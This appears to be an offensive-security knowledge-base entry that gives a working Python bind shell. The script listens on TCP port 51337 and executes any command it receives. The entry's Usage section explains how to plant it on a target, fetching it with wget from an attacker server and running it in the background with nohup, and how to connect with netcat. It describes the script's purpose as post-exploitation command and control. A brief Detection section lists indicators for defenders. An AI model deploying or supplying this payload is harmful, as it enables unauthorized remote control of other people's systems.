---
id: e4d6a3cd-ab8c-4af6-876c-e306c991c050
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:08.776991+00:00'
updated_at: '2023-04-10T20:21:16.295744+00:00'
platforms:
  - Linux
  - macOS
tags:
  - bind-shell
  - payload
  - python
validated: true
---

# Python-Bind-Shell-Script

## Code

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

## Description

This Python script implements a basic bind shell that listens on TCP port 51337 for an incoming connection, executes received commands via subprocess.Popen with shell=True, and sends back the combined stdout and stderr. It uses socket for networking and is designed for post-exploitation command and control on Unix-like systems with Python available.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `0.0.0.0` | Bind address (all interfaces); change to specific IP if needed | `127.0.0.1` |
| `51337` | Listening port; select a non-privileged port >1024 | `4444` |

## Usage

Save the script as a .py file on the target or inject it via existing access (e.g., wget from attacker server, then `python script.py`). It runs in the foreground; background with `nohup python script.py &`. Connect using netcat: `nc target_ip 51337`. Ideal for scenarios with initial RCE but no native shell tools.

## Detection

- Process monitoring: Look for python processes with socket binds on unusual ports (e.g., `lsof -i :51337` or `netstat -tlnp`)
- Network logs: Inbound TCP connections to non-standard ports from untrusted sources
- Behavioral: Python spawning subprocess for shell commands; enable Python logging or EDR for script execution
- File system: Presence of the .py file if saved persistently

## Related

- [[procedures/Python-Bind-Shell]]
- [[commands/netcat-connect-bind-shell]]
